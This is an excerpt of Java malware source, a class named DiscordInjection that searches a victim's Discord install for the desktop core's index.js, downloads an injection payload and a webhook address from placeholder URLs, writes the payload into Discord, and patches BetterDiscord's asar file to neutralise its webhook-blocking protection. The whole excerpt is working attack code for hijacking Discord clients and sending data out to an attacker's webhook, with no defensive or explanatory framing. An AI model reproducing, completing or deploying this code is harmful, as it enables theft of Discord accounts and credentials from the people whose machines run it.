...
public class DiscordInjection {
    public transient static DiscordInjection instance;

    private transient static String discordPath, betterPath, localPath;
    {
                                    ...
                                    for (int i = 0; directories.length > i; i += 1) {
                                        for (File file4 : (directories[i]).listFiles(File::isDirectory)) {
                                            if ((String.valueOf(file4)).contains("discord_desktop_core")) {
                                                if (!legitMode) (new File(String.valueOf(file4) + "/benadryl")).mkdirs();
                                                for (File file5 : (new File(String.valueOf(file4))).listFiles(File::isFile)) {
                                                    if ((String.valueOf(file5)).contains("index.js")) {
                                                        String webhook = new java.util.Scanner(new URL(decode("//herethewebhook")).openStream()).useDelimiter("\\A").next();
                                                        Scanner scanner = new Scanner(new URL("//hereinjection").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
                                                        List<String> results = new ArrayList<String>();
                                                        results.add(scanner.next().replace("%WEBHOOK_LINK%", webhook));
            ...
            if ((new File(betterPath)).isDirectory()) {
                for (File file : (new File(betterPath)).listFiles(File::isFile)) {
                    if ((String.valueOf(file)).endsWith("betterdiscord.asar")) {
                        ...
                        data = data.replace("api/webhook", "benadryl/uwu");
